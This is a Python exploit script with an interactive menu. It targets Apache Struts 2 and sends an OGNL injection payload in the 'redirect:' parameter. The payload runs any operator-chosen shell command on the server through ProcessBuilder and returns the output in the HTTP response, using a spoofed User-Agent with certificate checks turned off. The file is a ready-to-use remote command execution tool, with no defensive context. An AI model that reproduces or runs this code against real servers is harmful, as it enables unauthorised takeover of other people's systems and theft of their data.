import requests
import readline
 

class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'


class Exploit(object):
    def __init__(self, M_command, vulnerable_url):
        self.M_command = M_command
        self.vulnerable_url = vulnerable_url
    def send_attack(self):
        first = self.vulnerable_url + "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','"
        second = "'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
        response = requests.get(first+self.M_command+second,headers = headers,verify=False)
        try:
            if response.status_code == 200:
                print(response.content)
            else:
                print("Failed")
        except requests.exceptions.RequestException as error:
            print(error)

options = \
"""
Variable              Description            Needed
--------              -----------            ------
target_url            vulnerable url          yes
command               command to execute      yes

(example)
    set target_url http://localhost/whatever
    set command id;ls;whoami
    run / exploit
"""
def interaction():
    while True:
        try:
            module = input(f"{Colors.red}(Apache Struts 2 Remote Command Execution){Colors.end} [MODULE]:~#")
            if module == "exit" or module == "back":
                break
            elif module == "options" or module == "help":
                print(options)
            elif "set target_url " in module:
                TARGET = module[15:]
                print(f"target url: {Colors.red}{TARGET}{Colors.end}")
            elif "set command " in module:
                COMMAND = module[12:]
                print(f"command: {Colors.red}{COMMAND}{Colors.end}")
            elif module == "run" or module == "exploit":
                attack = Exploit(vulnerable_url=TARGET, M_command=COMMAND)
                attack.send_attack()
            else:
                continue 
        except KeyboardInterrupt:
            exit()
if __name__ == "__main__":
    interaction()